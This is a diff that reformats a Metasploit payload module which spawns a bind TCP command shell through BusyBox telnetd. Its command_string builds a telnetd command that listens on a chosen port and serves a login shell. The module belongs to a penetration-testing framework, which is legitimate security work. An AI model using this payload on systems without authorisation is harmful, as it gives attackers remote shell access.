@@ -3,31 +3,32 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 26
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-     'Name'          => 'Unix Command Shell, Bind TCP (via BusyBox telnetd)',
-     'Description'   => 'Listen for a connection and spawn a command shell via BusyBox telnetd',
-     'Author'        => 'Matthew Kienow <matthew_kienow[AT]rapid7.com>',
-     'License'       => MSF_LICENSE,
-     'Platform'      => 'unix',
-     'Arch'          => ARCH_CMD,
-     'Handler'       => Msf::Handler::BindTcp,
-     'Session'       => Msf::Sessions::CommandShell,
-     'PayloadType'   => 'cmd',
-     'RequiredCmd'   => 'telnetd',
-     'Payload'       => {
-       'Offsets' => { },
-       'Payload' => ''
-     }
-   ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Unix Command Shell, Bind TCP (via BusyBox telnetd)',
+        'Description' => 'Listen for a connection and spawn a command shell via BusyBox telnetd',
+        'Author' => 'Matthew Kienow <matthew_kienow[AT]rapid7.com>',
+        'License' => MSF_LICENSE,
+        'Platform' => 'unix',
+        'Arch' => ARCH_CMD,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'cmd',
+        'RequiredCmd' => 'telnetd',
+        'Payload' => {
+          'Offsets' => {},
+          'Payload' => ''
+        }
+      )
+    )
 
     register_options(
       [
@@ -57,5 +58,4 @@ module MetasploitModule
   def command_string
     "#{datastore['TelnetdPath']} -l #{datastore['LOGIN_CMD']} -p #{datastore['LPORT']}"
   end
-
 end
